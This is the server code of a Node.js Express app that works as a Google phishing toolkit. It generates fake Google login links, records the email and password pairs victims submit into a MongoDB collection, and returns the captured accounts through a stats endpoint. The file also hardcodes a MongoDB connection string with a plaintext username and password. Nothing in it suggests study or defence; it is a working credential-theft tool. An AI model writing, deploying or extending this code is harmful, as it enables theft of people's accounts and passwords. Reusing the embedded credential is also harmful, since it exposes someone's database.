const express = require('express');
const app = express();
const upload = require('express-fileupload')
const generator = require('otp-generator')
const PORT = process.env.PORT || 5000;
const { MongoClient, ServerApiVersion } = require('mongodb');
const uri = "mongodb+srv://Jeswin:Jeswin2009@cluster0.5nwhj.mongodb.net/?retryWrites=true&w=majority";
// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

app.use(express.json());
app.use(upload());
app.use('/', express.static('./public'))

app.get('/', (req, res) => {
    res.redirect('/generators');
})

app.get('/api/generate/google', async (req, res) => {
    const linkID = generator.generate(10, { specialChars: false });
    const phishLink = `/google/login/#${linkID}`;
    const statsID = generator.generate(10, { specialChars: false });

    try {
        
        const collection = await client.db('toolkit').collection('links');
        collection.insertOne({
            linkID: linkID,
            phishLink: phishLink,
            statsID: statsID,
            canFlush: true,
            accounts: []
        });

      } catch {
        print('There was an error')
      }
      res.status(200).send({ success: true, linkData: {
        linkID: linkID,
        phishLink: phishLink,
        statsID: statsID
      } });
})

app.post('/api/store/google', async (req, res) => {
  const linkID = req.body.linkID;
  const email = req.body.email;
  const password = req.body.password;


  try {
        
    const collection = await client.db('toolkit').collection('links');
    collection.updateOne({
      linkID: linkID
    }, {
      $push: { accounts: { email: email, password: password } }
    })

  } catch {
    print('There was an error')
  }
  res.send({ success: true })
})
app.get('/google/stats', async(req, res) => {
  const statsID = req.query.statsID;

  try {
        
    const collection = await client.db('toolkit').collection('links');
    const doc = await collection.findOne({
      statsID: statsID
    });
    res.status(200).send(doc.accounts);

  } catch {
    res.send('There was an error processing your request... Try later after taking a Poha break!')
  }
})

app.get('/api/flush-db', async (req, res) => {
  try {
        
    const collection = await client.db('toolkit').collection('links');
    collection.deleteMany({
      canFlush: true
    });

  } catch {
    print('There was an error')
  }

  res.send('Database flush successful')
})


app.listen(PORT, console.log(`Server is up at the port: ${PORT}`));